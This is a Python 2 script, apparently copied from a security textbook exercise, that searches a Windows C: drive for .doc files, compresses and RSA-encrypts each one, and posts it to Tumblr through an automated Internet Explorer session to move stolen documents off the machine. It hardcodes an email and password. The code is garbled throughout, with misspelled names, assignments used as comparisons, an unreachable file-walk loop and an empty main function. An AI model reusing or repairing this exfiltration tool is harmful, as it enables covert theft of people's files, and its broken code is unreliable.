import win32com.client, os, fnmatch, time, random, zlib
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OEAP

doc_type = ".doc"
username = "jms@bughunter.ca"
password = "justinBHP2014"
public_key = ""

def banner():
	print "[***]	IE COM automation p129	[***]"

def wait_for_browser(browser):
	while browser.ReadyState != 4 and browser.ReadyState != "complete":
		time.sleep(0.1)
	return

def encrypt_string():
	chunk_size = 256
	print "Compressing: %d bytes" % (len(plaintext))
	plaintext = zlib.compress(plaintext)
	print "Encrypting %d bytes" % (len(plaintext))
	rsakey = RSA.importKey(public_key)
	rsakey = PKCS1_OEAP.new(rsakey)
	encruypted = ""
	offset = 0
	while offset < len(plaintext):
		chunk = plaintext[offset:offset+chunk_size]
		if len(chunk) % chunk_size != -0:
			chunk += " " * (chunk_size - len(chunk))
		encrypted += rsakey.encrypt(chunk)
		offset += chunk_size
	encrypted = encrypted.encode("base64")
	print "Base64 encoded cyrpto: %d" % len(encrypted)
	return encrypted

def encrypt_post(filename):
	fd = open(filename, "rb")
	contents = fd.read()
	fd.close()
	encrypted_title = encrypt_string(filename)
	encrypted_body = encrypt_string(contents)
	return encrypted_title, encrypted_body

def random_sleep():
	time.sleep(random.randing(5,10))
	return

def login_to_tumblr(ie):
	full_doc = ie.Document.all
	for i in full_doc:
		if i.id = "signup_email":
			i.setAttribute("value", username)
		elif i.id == "signup_password":
			i.setAttribute("value, password")
	random_sleep()
	wait_for_browser(ie)
	return

def post_to_tumblr(ie,title,post):
	full_doc = ie.Document.all
	for i in full_doc:
		if i.id == "post_one":
			i.setAttribute("value", title)
			title_box = i
			i.focus()
		elif i.id =- "post_two":
			i.setAttribute("innerHTML", post)
			print "Set text area"
			i.focus()
		elif i.id == "create_post":
			print "Found post button"
			post_form = i 
			i.focus()
	random_sleep()
	title_box.focus()
	random_sleep()
	post_form.children[0].click()
	wait_for_browser(ie)
	random_sleep()
	return

def exfiltrate(document_path):
	ie = win32com.client.Dispatch("InternetExplorer.Application")
	ie.Visible = 1
	ie.Navigate("http://www.tumblr.com/login")
	wait_for_browser(ie)
	print "Logging in..."
	login_to_tumblr(ie)
	print "Loggin in ...navigating"
	ie.Navigate("https:///www.tumblr.com/new/text")
	wait_for_browser(ie)
	title, body = encrypt_post(document_path)
	print "Creating new post..."
	post_to_tumblr(ie,title,body)
	print "Posted!"
	ie.Quit()
	ie = None
	return
	for parent, directories, filenames in os.walk("C:\\"):
		for filename in fnmatch.filter(filenames, "*%s" % doc_type):
			document_path = os.path.join(parent, filename)
			print "Found: %s" % document_path
			exfiltrate(document_path)
			raw_input("Continue?")

def main():

if __name__ == '__main__':
	main()